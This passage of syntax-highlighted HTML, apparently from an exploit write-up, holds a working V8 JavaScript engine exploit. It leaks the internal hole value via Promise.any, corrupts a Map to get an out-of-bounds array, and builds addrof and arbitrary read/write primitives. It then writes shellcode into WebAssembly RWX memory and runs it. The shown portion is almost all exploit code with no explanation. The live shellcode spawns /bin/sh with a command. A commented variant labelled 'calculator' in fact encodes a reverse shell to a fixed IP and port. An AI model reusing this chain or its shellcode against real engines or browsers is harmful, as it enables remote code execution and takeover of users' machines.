style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#a13865">{</span><br><span style="color:#B07D48">            v1</span><span style="color:#999999"> =</span><span style="color:#B07D48"> v5</span><span style="color:#999999">.</span><span style="color:#B07D48">errors</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#a13865">}</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#B07D48">    f0</span><span style="color:#999999">.</span><span style="color:#59873A">resolve</span><span style="color:#999999"> =</span><span style="color:#AB5959"> function</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48">v6</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">        return</span><span style="color:#B07D48"> v6</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> v3</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        then</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">v7</span><span style="color:#999999">,</span><span style="color:#B07D48"> v8</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#59873A">            v8</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#a65e2b">}</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><span style="color:#999999">;</span><br><span style="color:#998418">    Promise</span><span style="color:#999999">.</span><span style="color:#B07D48">any</span><span style="color:#999999">.</span><span style="color:#59873A">call</span><span style="color:#1e754f">(</span><span style="color:#B07D48">f0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">[</span><span style="color:#B07D48">v3</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> v1</span><span style="color:#1e754f">[</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> hole</span><span style="color:#999999"> =</span><span style="color:#59873A"> trigger</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">var</span><span style="color:#B07D48"> map</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Map</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">map</span><span style="color:#999999">.</span><span style="color:#59873A">set</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">kiprey</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">map</span><span style="color:#999999">.</span><span style="color:#59873A">set</span><span style="color:#2993a3">(</span><span style="color:#B07D48">hole</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0x8</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">map</span><span style="color:#999999">.</span><span style="color:#59873A">delete</span><span style="color:#2993a3">(</span><span style="color:#B07D48">hole</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">map</span><span style="color:#999999">.</span><span style="color:#59873A">delete</span><span style="color:#2993a3">(</span><span style="color:#B07D48">hole</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">map</span><span style="color:#999999">.</span><span style="color:#59873A">delete</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">kiprey</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">print</span><span style="color:#2993a3">(</span><span style="color:#B07D48">map</span><span style="color:#999999">.</span><span style="color:#B07D48">size</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">map</span><span style="color:#999999">.</span><span style="color:#59873A">set</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0x18</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">kiprey</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">var</span><span style="color:#B07D48"> nop</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> Array</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">var</span><span style="color:#B07D48"> oobArray</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2993a3">]</span><span style="color:#999999">;</span><br><span style="color:#B07D48">oobArray</span><span style="color:#999999">.</span><span style="color:#59873A">push</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1.1</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">var</span><span style="color:#B07D48"> objArray</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B5695977">    "</span><span style="color:#B56959">tag</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><span style="color:#2F798A"> 0xdead</span><span style="color:#999999">,</span><br><span style="color:#B5695977">    "</span><span style="color:#B56959">leak</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><span style="color:#2F798A"> 0x1234</span><span style="color:#999999">,</span><br><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br><span style="color:#B07D48">bigUintArray</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> BigUint64Array</span><span style="color:#2993a3">(</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">bigUintArray</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x1234</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#B07D48">bigUintArray</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0x5678</span><span style="color:#AB5959">n</span><span style="color:#999999">;</span><br><span style="color:#B07D48">map</span><span style="color:#999999">.</span><span style="color:#59873A">set</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">1</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">kiprey</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">addrof</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#B07D48">obj</span><span style="color:#2993a3">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    objArray</span><span style="color:#999999">.</span><span style="color:#B07D48">leak</span><span style="color:#999999"> =</span><span style="color:#B07D48"> obj</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    for</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#2F798A"> 0x3000</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#AB5959">++</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#AB5959">        let</span><span style="color:#B07D48"> half</span><span style="color:#999999"> =</span><span style="color:#59873A"> d2u</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">oobArray</span><span style="color:#a13865">[</span><span style="color:#B07D48">i</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">half</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#a13865">]</span><span style="color:#AB5959"> ==</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#2F798A">0xdead</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 1</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">            ret</span><span style="color:#999999"> =</span><span style="color:#B07D48"> half</span><span style="color:#a13865">[</span><span style="color:#2F798A">1</span><span style="color:#a13865">]</span><span style="color:#999999">;</span><br><span style="color:#1E754F">            break</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#a65e2b">}</span><span style="color:#1E754F"> else</span><span style="color:#1E754F"> if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">half</span><span style="color:#a13865">[</span><span style="color:#2F798A">1</span><span style="color:#a13865">]</span><span style="color:#AB5959"> ==</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#2F798A">0xdead</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 1</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B07D48">            ret</span><span style="color:#999999"> =</span><span style="color:#59873A"> d2u</span><span style="color:#a13865">(</span><span style="color:#B07D48">oobArray</span><span style="color:#bda437">[</span><span style="color:#B07D48">i</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#bda437">]</span><span style="color:#a13865">)</span><span style="color:#a13865">[</span><span style="color:#2F798A">0</span><span style="color:#a13865">]</span><span style="color:#999999">;</span><br><span style="color:#1E754F">            break</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#a65e2b">}</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">    return</span><span style="color:#59873A"> BigInt</span><span style="color:#1e754f">(</span><span style="color:#B07D48">ret</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> base_offset</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> external_offset</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> big_len_offset</span><span style="color:#999999">;</span><br><span style="color:#1E754F">for</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#2F798A"> 0x3000</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#AB5959">++</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">f2i</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">oobArray</span><span style="color:#a13865">[</span><span style="color:#B07D48">i</span><span style="color:#a13865">]</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 0x1234</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#B07D48">        base_offset</span><span style="color:#999999"> =</span><span style="color:#B07D48"> i</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 12</span><span style="color:#999999">;</span><br><span style="color:#B07D48">        external_offset</span><span style="color:#999999"> =</span><span style="color:#B07D48"> i</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 11</span><span style="color:#999999">;</span><br><span style="color:#B07D48">        big_len_offset</span><span style="color:#999999"> =</span><span style="color:#B07D48"> i</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 10</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        break</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> base_ptr</span><span style="color:#999999"> =</span><span style="color:#59873A"> f2i</span><span style="color:#2993a3">(</span><span style="color:#B07D48">oobArray</span><span style="color:#1e754f">[</span><span style="color:#B07D48">base_offset</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> external_ptr</span><span style="color:#999999"> =</span><span style="color:#59873A"> f2i</span><span style="color:#2993a3">(</span><span style="color:#B07D48">oobArray</span><span style="color:#1e754f">[</span><span style="color:#B07D48">external_offset</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> big_len</span><span style="color:#999999"> =</span><span style="color:#59873A"> f2i</span><span style="color:#2993a3">(</span><span style="color:#B07D48">oobArray</span><span style="color:#1e754f">[</span><span style="color:#B07D48">big_len_offset</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">arb_r</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#B07D48">addr</span><span style="color:#2993a3">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#B07D48">    oobArray</span><span style="color:#1e754f">[</span><span style="color:#B07D48">base_offset</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#59873A"> i2f</span><span style="color:#1e754f">(</span><span style="color:#B07D48">addr</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 0x8</span><span style="color:#AB5959">n</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> ret</span><span style="color:#999999"> =</span><span style="color:#B07D48"> bigUintArray</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#B07D48"> ret</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#59873A">arb_w</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#B07D48">addr</span><span style="color:#999999">,</span><span style="color:#B07D48"> payload</span><span style="color:#2993a3">)</span><span style="color:#999999"> =</span><span style="color:#999999">></span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    let</span><span style="color:#B07D48"> sc</span><span style="color:#999999"> =</span><span style="color:#59873A"> ByteToBigIntArray</span><span style="color:#1e754f">(</span><span style="color:#B07D48">payload</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    oobArray</span><span style="color:#1e754f">[</span><span style="color:#B07D48">big_len_offset</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#59873A"> i2f</span><span style="color:#1e754f">(</span><span style="color:#59873A">BigInt</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">sc</span><span style="color:#999999">.</span><span style="color:#998418">length</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    oobArray</span><span style="color:#1e754f">[</span><span style="color:#B07D48">base_offset</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#59873A"> i2f</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#AB5959">n</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    oobArray</span><span style="color:#1e754f">[</span><span style="color:#B07D48">external_offset</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#59873A"> i2f</span><span style="color:#1e754f">(</span><span style="color:#B07D48">addr</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    for</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">let</span><span style="color:#B07D48"> i</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#999999"> </span><span style="color:#999999">&#x3C;</span><span style="color:#B07D48"> sc</span><span style="color:#999999">.</span><span style="color:#998418">length</span><span style="color:#999999">;</span><span style="color:#B07D48"> i</span><span style="color:#AB5959"> +=</span><span style="color:#2F798A"> 1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#B07D48">        bigUintArray</span><span style="color:#a65e2b">[</span><span style="color:#B07D48">i</span><span style="color:#a65e2b">]</span><span style="color:#999999"> =</span><span style="color:#B07D48"> sc</span><span style="color:#a65e2b">[</span><span style="color:#B07D48">i</span><span style="color:#a65e2b">]</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#2993a3">}</span><br><br><br><span style="color:#AB5959">let</span><span style="color:#B07D48"> rwx_mem</span><span style="color:#999999"> =</span><span style="color:#59873A"> arb_r</span><span style="color:#2993a3">(</span><span style="color:#59873A">addrof</span><span style="color:#1e754f">(</span><span style="color:#B07D48">wasm_instance</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0x60</span><span style="color:#AB5959">n</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">print</span><span style="color:#2993a3">(</span><span style="color:#B07D48">rwx_mem</span><span style="color:#999999">.</span><span style="color:#59873A">toString</span><span style="color:#1e754f">(</span><span style="color:#2F798A">16</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">arb_w</span><span style="color:#2993a3">(</span><span style="color:#B07D48">rwx_mem</span><span style="color:#999999">,</span><span style="color:#B07D48"> shellcode</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">f</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-javascript language-javascript"><span style="color:#CB7676">let</span><span style="color:#BD976A"> wasm_code</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Uint8Array</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 97</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 115</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 109</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 133</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 96</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 127</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 130</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 132</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 112</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 5</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 131</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 6</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 129</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 7</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 145</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 6</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 109</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 101</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 109</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 111</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 114</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 121</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 109</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 97</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 105</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 110</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 138</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 132</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 128</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 65</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 42</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 11</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> wasm_mod</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Module</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">wasm_code</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> wasm_instance</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#BD976A"> WebAssembly</span><span style="color:#666666">.</span><span style="color:#80A665">Instance</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">wasm_mod</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> f</span><span style="color:#666666"> =</span><span style="color:#BD976A"> wasm_instance</span><span style="color:#666666">.</span><span style="color:#BD976A">exports</span><span style="color:#666666">.</span><span style="color:#BD976A">main</span><span style="color:#666666">;</span><br><br><span style="color:#758575DD">// shellcoode /bin/bash</span><br><span style="color:#758575DD">// const shellcode = new Uint8Array([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52,0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69,0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x56, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x0f,0x05]);</span><br><br><span style="color:#758575DD">// shellcode calculator</span><br><span style="color:#758575DD">// const shellcode = new Uint8Array([0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01,</span><br><span style="color:#758575DD">// 	0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x0a, 0xa8,</span><br><span style="color:#758575DD">// 	0x01, 0x5e, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f,</span><br><span style="color:#758575DD">// 	0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,</span><br><span style="color:#758575DD">// 	0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,</span><br><span style="color:#758575DD">// 	0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05]);</span><br><br><span style="color:#CB7676">const</span><span style="color:#BD976A"> shellcode</span><span style="color:#666666"> =</span><span style="color:#CB7676"> new</span><span style="color:#80A665"> Uint8Array</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0x48</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0xb8</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x2f</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x62</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x69</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x6e</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x2f</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x73</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x68</span><span style="color:#666666">,</span><br><span style="color:#4C9A91">  0x00</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x99</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x50</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x54</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x5f</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x52</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x66</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x68</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x2d</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x63</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x54</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x5e</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x52</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0xe8</span><span style="color:#666666">,</span><br><span style="color:#4C9A91">  0x0d</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x00</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x00</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x00</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x63</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x61</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0x74</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 